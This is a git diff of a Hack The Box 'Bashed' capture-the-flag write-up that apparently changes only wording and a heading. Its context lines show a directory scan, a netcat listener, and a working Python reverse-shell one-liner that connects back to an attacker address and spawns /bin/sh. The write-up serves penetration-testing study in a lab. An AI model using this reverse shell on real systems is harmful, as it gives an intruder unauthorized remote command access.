@@ -28,8 +28,7 @@ feroxbuster -u http://10.10.10.68 -x html,php,json,js,sh,cgi,pl,docx,pdf,txt -w 
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a7c07f5a-dc65-41f9-983c-1aa0f5697877)
 
-+ Get revershell:
-+ Run on your kali attack vm: `nc -lnvp 4444`
++ Get more stable revershell. Run on your kali attack vm: `nc -lnvp 4444`
 + Run python reverse shell on the target's browser based semi interactive shell:
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -74,7 +73,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c1b923d8-5e44-4c00-b9ab-c0405253686a)
 
 
-# References & Alternatives:
+# References & Alternatives
 + https://vvmlist.github.io/#bashed
 + https://0xdf.gitlab.io/2018/04/29/htb-bashed.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/bashed-writeup-w-o-metasploit
